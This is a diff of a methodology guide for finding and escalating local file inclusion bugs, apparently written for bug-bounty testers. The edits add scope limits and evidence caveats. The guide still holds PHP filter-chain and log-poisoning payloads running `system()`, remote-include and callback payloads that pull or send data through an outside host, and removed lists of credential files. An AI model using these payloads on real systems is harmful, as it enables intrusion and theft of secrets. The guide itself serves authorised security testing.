@@ -34,10 +34,10 @@ report_count: 24
 
 ## Crown Jewel Targets
 
-LFI that reaches code execution is Critical. Pure file-read is High when it exposes secrets (`.env`, `wp-config.php`, private keys, cloud creds), Medium when it only reads non-sensitive files.
+LFI that reaches code execution is Critical. Potential severity depends on the program and effective access; file-read may be High when it exposes secrets (`.env`, `wp-config.php`, private keys, cloud creds), Medium when it only reads non-sensitive files.
 
-**Highest-value chains (in rough order of reliability in 2026):**
-- **PHP filter-chain → RCE** — the modern default. A bare `php://filter` *file-read* primitive is upgraded to RCE with **no upload endpoint and no writable file** by chaining `iconv` conversions to forge an arbitrary PHP payload in-memory (Synacktiv, 2022). See the dedicated section below. This is the single most impactful thing to try and the most-missed.
+**Possible chains (each needs its own prerequisites and scope):**
+- **PHP filter-chain → RCE** — the modern default. A PHP include/require sink that permits suitable filter chains may reach code execution with **no upload endpoint and no writable file** by chaining `iconv` conversions to forge an arbitrary PHP payload in-memory (Synacktiv, 2022). See the dedicated section below. A read-only API such as file_get_contents does not execute generated PHP.
 - **Log poisoning → RCE** — inject PHP into an Apache/Nginx log (User-Agent / URL path), then include the log. Increasingly blocked by `open_basedir` and unreadable log perms, so verify the log is *readable* first.
 - **PHP wrappers → source disclosure** — `php://filter/convert.base64-encode/resource=index.php` leaks source; read source to find more LFI sinks, secrets, and the include base path.
 - **RFI → RCE** — when `allow_url_include=On`, `?file=http://OOB/shell.txt` pulls and executes remote code. Rare on modern configs but trivially Critical when present.
@@ -57,14 +57,14 @@ LFI is frequently **blind**: the included content is parsed/executed but never r
 
 ### What IS confirmation
 - **Direct read:** actual file *contents* appear (real `root:x:0:0:` line, real PHP source after base64-decoding the filter output).
-- **Blind read via OOB exfil:** use a php://filter or XXE-style chain whose payload performs a DNS/HTTP callback to your **Burp Collaborator** subdomain, or use an `expect://` / wrapper that triggers an outbound request. A unique-per-sink Collaborator hit (DNS + HTTP, with the server's source IP) proves the include ran.
-- **Blind read via differential/timing:** include a file you *know* exists and is large (`/etc/passwd`) vs one that does not (`/etc/passwd_nope_<rand>`). Stable, repeatable response-length or latency delta = real filesystem access. Confirm with a third known-good path to rule out coincidence.
+- **OOB request:** a callback proves a request path, not local file read or PHP execution by itself. It may be SSRF, a scanner, DNS resolver or URL preview; correlate a synthetic nonce and owner-side evidence before classifying.
+- **Blind read via differential/timing:** include a file you *know* exists and is large (`/etc/passwd`) vs one that does not (`/etc/passwd_nope_<rand>`). Stable timing/size differences are hypotheses, not proof of filesystem access. Use owner-controlled canary content or server-side instrumentation.
 
 ### Default workflow
-1. Pick a **unique marker** target: prefer a file whose content you can fingerprint exactly (`/etc/passwd` → grep `^root:`). For blind, use a php://filter base64 read and decode — partial/truncated base64 still decodes to recognizable source.
+1. Pick a **unique marker** target: prefer an owner-created non-sensitive canary file outside the permitted subtree, with a marker not included in the request. For blind, use a php://filter base64 read and decode — strictly decode complete base64 groups and report recovered bytes only; truncated base64 may not decode to recognizable source.
 2. Generate a sub-tagged Collaborator payload per sink (`lfi-page.<collab>`, `lfi-tpl.<collab>`) so callbacks identify which parameter fired.
 3. Send, wait 30–120s, poll OOB.
-4. Claim LFI **only** after a content match, a Collaborator callback, or a stable triple-confirmed timing/length delta. Echoed paths and lone status-code changes are retracted.
+4. Claim file read only with content/owner-side evidence; callbacks and timing/length alone do not establish LFI. Echoed paths and lone status-code changes are retracted.
 
 ---
 
@@ -91,6 +91,17 @@ JSON bodies: {"filename":...} {"template":...} {"path":...}
 | Windows IIS / .NET | `..\..\web.config`, `C:\Windows\win.ini`, machineKey |
 
 ---
+
+## Prerequisites and stopping conditions
+
+Before any approved request, bound host/path count, request rate, total requests,
+response bytes and runtime; disable unexpected redirects and verify TLS. The
+unbounded historical fuzzing commands below are tool-shape examples, not ready
+production commands. Preserve evidence privately, use test accounts and record
+rollback/cleanup for any separately approved writes. PHAR automatic metadata
+unserialization is version/API-dependent; merely opening an archive URI on a
+current PHP runtime does not establish object injection. `?`/`#` suffix tricks
+depend on URL/wrapper parsing and do not universally truncate local include paths.
 
 ## Step-by-Step Methodology
 
@@ -130,7 +141,7 @@ ffuf -u "https://$TARGET/FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
 ```
 
 ### Phase 4 — PHP Filter-Chain → RCE (no upload, no writable file)
-The modern flagship technique (Synacktiv, 2022). If you have a `php://`-capable LFI that *reads* a file, you can also *execute* attacker-chosen PHP. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged — then `include()` runs it. **No upload endpoint, no log access, no writable path required.**
+The modern flagship technique (Synacktiv, 2022). A php://-capable read alone does not execute PHP. Execution requires an include/require evaluation sink plus available filters/conversions and compatible input limits. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged — then `include()` runs it. **No upload endpoint, no log access, no writable path required.**
 
 ```bash
 # Generate the chain (public tool, no CVE — it abuses documented iconv behaviour):
@@ -141,10 +152,10 @@ python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
 ?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...<long-chain>...|convert.base64-decode/resource=php://temp&c=id
 ```
 Notes / gotchas:
-- Requires the include sink to accept the `php://filter` scheme (most LFI sinks calling `include`/`require`/`file_get_contents` on the param do).
+- Requires the include sink to accept the `php://filter` scheme (most LFI sinks calling `include`/`require` on the param do).
 - Payloads get **long** (10–50KB). If the param is length-capped or WAF-blocked on size, move it to a POST body, or use a minimal payload (`<?=`shorthand`?>`).
 - For blind targets, set the chain payload to a Collaborator callback (`<?php file_get_contents("http://x.<collab>/".`id`);?>`) to confirm execution OOB.
-- This works even when log poisoning fails (unreadable logs, `open_basedir`). Try it whenever you have a php:// filter read.
+- This works even when log poisoning fails (unreadable logs, `open_basedir`). Do not automatically escalate a read proof to code execution.
 
 ### Phase 5 — Code-Execution Wrappers (config prerequisites)
 ```bash
@@ -167,7 +178,7 @@ RFI = the include target is a **remote URL**. Prerequisite: `allow_url_include=O
 ?file=https://OOB-HOST/shell.txt?
 ?file=ftp://OOB-HOST/shell.txt
 # Detection without RCE: point at a Burp Collaborator HTTP URL. A callback (server IP) = the
-# include fetched remotely → RFI confirmed even if execution is blocked. No callback = not RFI.
+# include fetched remotely → RFI confirmed even if execution is blocked. No callback is inconclusive because egress, DNS, TLS and parser behavior may block it.
 # Bypass appended extension (?file=$x.".php"): trailing ? or # to truncate, or ?file=http://OOB/shell
 ```
 
@@ -196,7 +207,7 @@ curl -s "https://$TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
 
 ### Phase 8b — Archive-extraction & image-processing sinks (no `?file=` needed)
 Two LFI/traversal surfaces that are not query-parameter file reads:
-- **Zip Slip / tar-symlink escape** — a server that untars/unzips a user-supplied archive follows `../../` entry names or embedded symlinks (tar preserves them) to read/write outside the extraction dir. Craft an archive entry named `../../../etc/cron.d/x`, or a symlink pointing at `/etc/passwd`; confirm by writing a unique canary outside the upload dir. Disclosed: reports/1439593, reports/733072, reports/822262.
+- **Zip Slip / tar-symlink escape** — a server that untars/unzips a user-supplied archive follows `../../` entry names or embedded symlinks (tar preserves them) to read/write outside the extraction dir. Craft an archive entry named `../approved-lab-parent/canary.txt`, or a lab symlink to an owner-created canary; any write test must stay inside an explicitly approved disposable parent directory. Disclosed: reports/1439593, reports/733072, reports/822262.
 - **ImageMagick coder read-sink** — image convert/thumbnail/avatar features read local files via MSL/MVG coders even with no file parameter: filename/label `label:@/etc/passwd`, or an MSL payload (`<image xlink:href="msl:/etc/passwd">`) plus `msl:`/`ephemeral:` pseudo-protocols (ImageTragick CVE-2016-3714 family). Disclosed: reports/1858574. Pairs with `hunt-file-upload`.
 
 ### Phase 9 — Automation (then manual-confirm everything)
@@ -212,8 +223,8 @@ dotdotpwn -m http -h $TARGET -o unix
 
 ## Named CVEs / Public Techniques (grounding)
 
-Verified, correctly-attributed references for the patterns above:
-- **PHP filter-chain to RCE** — Synacktiv research (2022); `php_filter_chain_generator`. Not a CVE; an abuse of documented `iconv` behaviour. The reason a bare file-read upgrades to Critical.
+Historical research leads requiring exact primary advisory/configuration verification before use:
+- **PHP filter-chain to RCE** — Synacktiv research (2022); `php_filter_chain_generator`. Not a CVE; an abuse of documented `iconv` behaviour. Not proof that an arbitrary file-read sink executes code.
 - **CVE-2021-41773** — Apache HTTP Server 2.4.49 path traversal (`%2e` in normalized path) → file read, and RCE when `mod_cgi` is enabled.
 - **CVE-2021-42013** — Apache HTTP Server 2.4.50 incomplete fix for the above (double-encoded `%%32%65`) → traversal/RCE.
 - **CVE-2024-4577** — PHP-CGI argument injection on Windows (Best-Fit encoding); reachable on XAMPP-style stacks, chains from file-serve to RCE.
@@ -222,23 +233,15 @@ Verified, correctly-attributed references for the patterns above:
 
 ---
 
-## Sensitive Files to Read
-```
-# Linux
-/etc/passwd  /etc/hosts  /etc/shadow (rarely readable)
-/proc/self/environ  /proc/self/cmdline  /proc/self/status
-/var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php
-/home/*/.ssh/id_rsa  /root/.ssh/id_rsa  /root/.bash_history
-/var/www/html/app/config/parameters.yml   # Symfony
-.git/config  .git/HEAD  composer.json  package.json
-# App / cloud secrets
-/proc/self/environ  ~/.aws/credentials  ~/.docker/config.json  /run/secrets/*
-# Windows / .NET
-C:\Windows\win.ini  C:\inetpub\wwwroot\web.config  ..\..\web.config
-C:\Windows\System32\inetsrv\config\applicationHost.config
-```
+## Proof minimization
 
----
+Begin with an owner-created synthetic marker file and a negative control. Stop
+once the approved read boundary is demonstrated. Do not collect `.env`, private
+keys, session files, password hashes or cloud credentials as a routine checklist.
+If sensitive content appears unintentionally, stop, redact and notify the owner
+through the approved channel; do not authenticate with it. Log/session poisoning,
+archive writes and RCE are separate invasive tests, never implied by a read scope.
+All examples in those sections are lab-only until that exact effect is approved.
 
 ## Bypass Table
 
@@ -260,7 +263,7 @@ C:\Windows\System32\inetsrv\config\applicationHost.config
 
 | LFI primitive | Chain to | Impact |
 |---------------|----------|--------|
-| `php://filter` read | **filter-chain RCE (Phase 4)** | RCE with no upload — **Critical** |
+| `php://filter` read | Check whether a distinct include/require sink exists | Read alone is not RCE |
 | File read | `.env` / `config.php` / `wp-config.php` | DB creds, API keys → backend takeover |
 | File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |
 | Remote URL include | RFI (`allow_url_include`) | direct RCE — **Critical** |
@@ -272,13 +275,13 @@ C:\Windows\System32\inetsrv\config\applicationHost.config
 ## Validation Discipline
 
 **Direct-read proof (not a false positive):**
-- Show real *contents*, not your echoed path. `/etc/passwd` must contain a literal `root:x:0:0:root:/root:` line. Diff the response against a known-good param value — the delta must be the file body, not a WAF/error page.
+- Show real *contents*, not your echoed path. A controlled canary must contain its expected marker; passwd layouts vary across systems. Diff the response against a known-good param value — the delta must be the file body, not a WAF/error page.
 - For source reads, the **base64 must decode to valid PHP**. A garbage/empty decode = no real read.
 - Rule out reflection: confirm the marker text is not simply your input bounced back. Request `/etc/passwd` and `/etc/passwd_<rand>` (non-existent) — only the real file returns content.
 
 **Blind / OOB proof:**
-- No reflection? Use a php://filter-chain or RFI payload that calls back to a **unique Burp Collaborator subdomain**. Require a DNS + HTTP hit with the server's source IP before claiming the include executed. Sub-tag per sink.
-- Timing/length blind: triple-confirm a stable delta (known-large file vs missing file vs second known file). One-off deltas are noise — retract.
+- No reflection? Use a php://filter-chain or RFI payload that calls back to a **unique Burp Collaborator subdomain**. A callback alone proves neither local file read nor execution; resolver/proxy addresses may differ from the server. Sub-tag per sink.
+- Timing/length blind: use controlled repeated observations only as leads and confirm via a canary or owner instrumentation; three repeats do not eliminate WAF/load confounders.
 
 **Partial / truncated reads:**
 - Templating may HTML-escape or cut the file. Use `php://filter/convert.base64-encode` so even a truncated read decodes to recognizable bytes; report exactly what you recovered, not what you assume is there.
